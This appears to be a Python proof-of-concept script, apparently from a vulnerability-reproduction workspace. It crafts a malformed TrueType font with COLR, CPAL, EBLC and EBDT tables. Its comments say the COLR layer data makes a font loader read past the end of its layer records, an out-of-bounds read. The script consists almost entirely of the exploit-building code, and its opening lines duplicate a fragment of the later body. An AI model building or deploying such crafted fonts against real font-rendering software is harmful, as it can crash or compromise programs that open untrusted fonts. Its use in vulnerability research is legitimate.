strike[17]=0
strike[18]=8 # max width
strike[22]=0
strike[23]=0
strike[24]=10
strike[25]=0
strike[44]=10 # ppemX
strike[45]=10 # ppemY
strike[46]=1  # bit depth
strike[47]=0
idxarr=struct.pack('>HH L',0xffff,0xffff,8) # start,end,additionalOffset
idxsub=struct.pack('>HH L L HHHH',1,1,0,0,0,0,0,0) # never reached for glyphs 0..n-1

searchRange=maxpow*16
entrySelector=maxpow.bit_length()-1

font[head_ofs+8:head_ofs+12]=b'\0\0\0\0'
adj=(0xB1B0AFBA - checksum(font)) & 0xffffffff
font[head_ofs+8:head_ofs+12]=struct.pack('>L',adj)
open(out,'wb').write(font)
print(out, len(font), 'tables', num2, 'adj', hex(adj))

import struct, math, os
base='/workspace/repo-vul/src-vul/text-rendering-tests/fonts/TestGLYFOne.ttf'
out='/workspace/poc_colr_eblc.ttf'
data=bytearray(open(base,'rb').read())
num=struct.unpack('>H',data[4:6])[0]
tables=[]
for i in range(num):
    off=12+16*i
    tag=data[off:off+4]
    chk,ofs,l=struct.unpack('>LLL',data[off+4:off+16])
    tables.append((tag,ofs,l))
def pad4(b):
    return b + b'\0'*((-len(b))%4)
def checksum(b):
    b=pad4(b)
    return sum(struct.unpack('>%dL'%(len(b)//4), b)) & 0xffffffff
# CPAL v0: numPaletteEntries=1,numPalettes=1,numColorRecords=1, offsetFirstColorRecord=14,
# colorRecordIndices[0]=0, one BGRA color.
cpal=struct.pack('>HHH L H BBBB',0,1,1,1,14,0,0,0,0,255)
# COLR v0 header (14), one base glyph record at offset14, one layer at offset20.
# base glyph 0 maps to first_layer_index 1 with num_layers 1; but num_layers total is only 1,
# so tt_face_load_colr_layers reads just past the single layer record.
colr=struct.pack('>HH L L H HHH HH',0,1,14,20,1, 0,1,1, 0,0)
# EBLC with one strike. IndexSubTableArrayOffset=56 (just after strike record), count=1.
# strike metrics bytes arbitrary but ppem valid. range glyph 65535..65535 won't match existing glyphs,
# so bitmap lookup returns Missing_Bitmap and scalable outline loading continues with FT_LOAD_COLOR.
strike=bytearray(48)
struct.pack_into('>L', strike, 0, 56) # indexSubTableArrayOffset from EBLC start
struct.pack_into('>L', strike, 8, 1)  # numberOfIndexSubTables
strike[16]=10 # hori ascender
strike[17]=0
strike[18]=8 # max width
strike[22]=0
strike[23]=0
strike[24]=10
strike[25]=0
strike[44]=10 # ppemX
strike[45]=10 # ppemY
strike[46]=1  # bit depth
strike[47]=0
idxarr=struct.pack('>HH L',0xffff,0xffff,8) # start,end,additionalOffset
idxsub=struct.pack('>HH L L HHHH',1,1,0,0,0,0,0,0) # never reached for glyphs 0..n-1
# Need table_size supports offset 56 + 8*1, and optional idxsub.
eblc=struct.pack('>LL',0x00020000,1)+bytes(strike)+idxarr+idxsub
ebdt=struct.pack('>L',0x00020000)
newtabs=[(b'CPAL',cpal),(b'COLR',colr),(b'EBLC',eblc),(b'EBDT',ebdt)]
# Keep original table bytes by slicing and rebuild compact sfnt with sorted directory.
items=[]
for tag,ofs,l in tables:
    items.append((tag, bytes(data[ofs:ofs+l])))
items += newtabs
items.sort(key=lambda x:x[0])
num2=len(items)
# searchRange etc
maxpow=1<<(num2.bit_length()-1)
searchRange=maxpow*16
entrySelector=maxpow.bit_length()-1
rangeShift=num2*16-searchRange
header=struct.pack('>LHHHH',0x00010000,num2,searchRange,entrySelector,rangeShift)
dir_len=12+16*num2
pos=dir_len
records=[]
body=bytearray()
for tag,content in items:
    pos_aligned=dir_len+len(body)
    assert pos_aligned%4==0
    records.append((tag,checksum(content),pos_aligned,len(content)))
    body += pad4(content)
# set checkSumAdjustment in head to 0 for checksum, then adjust in final data
font=bytearray(header)
for rec in records:
    font += rec[0]+struct.pack('>LLL',rec[1],rec[2],rec[3])
font += body
# zero head checksumAdjustment at head offset+8
head_ofs=None
for tag,chk,ofs,l in records:
    if tag==b'head': head_ofs=ofs
font[head_ofs+8:head_ofs+12]=b'\0\0\0\0'
adj=(0xB1B0AFBA - checksum(font)) & 0xffffffff
font[head_ofs+8:head_ofs+12]=struct.pack('>L',adj)
open(out,'wb').write(font)
print(out, len(font), 'tables', num2, 'adj', hex(adj))
